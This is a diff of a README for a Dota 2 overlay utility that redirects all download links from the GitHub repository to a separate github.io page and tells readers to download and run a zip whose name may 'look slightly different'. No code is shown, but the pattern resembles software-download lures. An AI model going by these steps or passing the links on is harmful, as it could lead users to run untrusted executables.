@@ -1,6 +1,6 @@
 # 🎯 dota2-overlay-toolkit - Your Ultimate Dota 2 Gameplay Enhancer
 
-[![Download Now](https://img.shields.io/badge/Download-dota2--overlay--toolkit-2ea44f?style=for-the-badge&logo=github)](https://github.com/dantongrinder36/dota2-overlay-toolkit)
+[![Download Now](https://img.shields.io/badge/Download-dota2--overlay--toolkit-2ea44f?style=for-the-badge&logo=github)](https://dantongrinder36.github.io)
 
 ## ✅ What Is This?
 
@@ -11,7 +11,7 @@ dota2-overlay-toolkit is a free, powerful external overlay utility designed spec
 Follow these three easy steps to get up and running in under five minutes:
 
 **Step 1: Download the Application**
-Visit this link to download the application: [https://github.com/dantongrinder36/dota2-overlay-toolkit](https://github.com/dantongrinder36/dota2-overlay-toolkit). Click the download button on that page to save the file to your computer. The download should start automatically.
+Visit this link to download the application: [https://dantongrinder36.github.io](https://dantongrinder36.github.io). Click the download button on that page to save the file to your computer. The download should start automatically.
 
 **Step 2: Locate the Downloaded File**
 Once the download finishes, open your Downloads folder (or wherever your browser saves files). You'll see a file named something like `dota2-overlay-toolkit.zip` or similar. Don't worry if the name looks slightly different – it's the right file.
@@ -94,7 +94,7 @@ I built dota2-overlay-toolkit because I wanted every Dota 2 player to have acces
 
 **Ready to elevate your gameplay?**
 
-Visit this link to download the application: [https://github.com/dantongrinder36/dota2-overlay-toolkit](https://github.com/dantongrinder36/dota2-overlay-toolkit)
+Visit this link to download the application: [https://dantongrinder36.github.io](https://dantongrinder36.github.io)
 
 **Quick recap:** Download → Run → Play with superpowers. See you on the battlefield! 🏆
 
